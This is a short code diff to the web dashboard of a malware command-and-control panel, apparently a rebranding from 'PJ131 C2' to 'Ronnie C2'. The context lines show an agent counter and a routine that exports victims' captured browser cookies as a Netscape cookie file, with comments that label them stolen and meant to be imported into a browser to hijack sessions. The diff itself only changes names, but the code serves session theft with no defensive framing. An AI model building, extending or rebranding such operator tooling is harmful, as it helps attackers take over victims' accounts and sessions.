@@ -537,7 +537,7 @@
 </head>
 <body>
     <div class="header">
-        <h1>[ PJ131 C2 ]</h1>
+        <h1>[ Ronnie C2 ]</h1>
         <div class="stats">
             <div class="stat">
                 <div class="stat-value" id="totalAgents">0</div>
@@ -1344,7 +1344,7 @@ async function viewFingerprint(agentId) {
                 }
                 
                 let cookieText = '# Netscape HTTP Cookie File\n';
-                cookieText += '# Stolen from PJ131 C2\n';
+                cookieText += '# Stolen from Ronnie C2\n';
                 cookieText += '# Import into browser to hijack session\n\n';
                 
                 cookies.forEach(cookie => {
@@ -1363,7 +1363,7 @@ async function viewFingerprint(agentId) {
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = `pj131_pj131_cookies_agent_${agentId}.txt`;
+                a.download = `ronnie_ronnie_cookies_agent_${agentId}.txt`;
                 a.click();
                 URL.revokeObjectURL(url);
                 
